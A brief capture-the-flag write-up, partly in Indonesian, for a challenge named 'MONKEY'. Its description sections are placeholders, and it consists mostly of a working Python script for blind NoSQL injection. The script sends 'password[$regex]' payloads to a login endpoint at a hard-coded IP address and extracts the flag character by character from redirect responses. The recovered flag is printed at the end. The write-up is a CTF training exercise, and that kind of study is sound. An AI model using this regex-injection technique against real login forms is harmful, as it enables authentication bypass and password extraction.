# **MONKEY**
description ....
## **About the challenge**
description
## **Solution**
bla bla bla
saya menggunakan script brute force dibawah ini
```python
import requests
import string

# We are sure that password is the flag which starts with "TWCTF{"
# and ends with "}"

flag = "ForestyHC{"
url = "http://103.167.136.89:10002/"

# Each time a 302 redirect is seen, we should restart the loop

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)

        # A correct password means we get a 302 redirect

        if r.status_code == 302:
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid redirect

            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break
```
And we got flag
```
ForestyHC{reject_humanity_return_to_monke_5543d8}
```
